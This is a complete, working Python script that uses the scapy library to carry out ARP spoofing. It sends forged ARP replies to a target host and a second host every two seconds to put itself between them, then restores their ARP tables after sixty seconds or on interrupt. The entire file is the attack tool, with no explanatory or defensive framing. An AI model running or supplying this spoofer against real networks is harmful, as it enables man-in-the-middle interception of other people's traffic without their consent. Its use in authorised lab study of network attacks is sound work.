#! /usr/bin/env python
import sys
import time

import scapy.all as scapy

import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP address to target")
    parser.add_argument("-s", "--source", dest="source", help="IP address to forge")
    options = parser.parse_args()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    target_mac = answered_list[0][1].hwsrc
    return target_mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0
time_elapsed = 0
try:
    while True:
        spoof(options.target, options.source)
        spoof(options.source, options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
        time_elapsed = time_elapsed + 2

        if time_elapsed == 60:
            print("\n[+] Session limit reached")
            print("[+] Restoring network traffic...")
            restore(options.target, options.source)
            restore(options.source, options.target)
            print("[+] Network traffic restored")
            break

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C... Initiating termination...")
    print("[+] Restoring network traffic...")
    restore(options.target, options.source)
    restore(options.source, options.target)
    print("[+] Network traffic restored")


